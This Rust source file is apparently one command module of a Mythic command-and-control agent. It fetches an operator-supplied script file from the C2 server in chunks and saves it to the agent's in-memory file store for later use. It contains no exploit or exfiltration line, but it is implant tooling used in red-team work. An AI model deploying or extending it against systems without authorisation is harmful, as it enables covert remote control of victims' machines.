use crate::structs::{GetFileFromMythicStruct, Task};
use serde::Deserialize;
use tokio::sync::mpsc;

#[derive(Deserialize)]
struct JsImportArgs {
    file_id: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: JsImportArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Request file from Mythic
    let (chunk_tx, mut chunk_rx) = mpsc::channel(10);
    let get_file = GetFileFromMythicStruct {
        task_id: task.data.task_id.clone(),
        full_path: String::new(),
        file_id: args.file_id.clone(),
        send_user_status_updates: false,
        received_chunk_channel: chunk_tx,
        tracking_uuid: String::new(),
        send_responses: task.job.send_responses.clone(),
        file_transfers: task.job.file_transfers.clone(),
    };

    if task.job.get_file_from_mythic.send(get_file).await.is_err() {
        response.set_error("Failed to request file from Mythic");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Collect all chunks
    let mut file_bytes = Vec::new();
    while let Some(chunk) = chunk_rx.recv().await {
        if chunk.is_empty() {
            break;
        }
        file_bytes.extend_from_slice(&chunk);
    }

    if file_bytes.is_empty() {
        response.set_error("Failed to get file");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    // Save to in-memory file store
    (task.job.save_file_func)(&args.file_id, &file_bytes);

    response.completed = true;
    response.user_output = "Imported script".to_string();
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
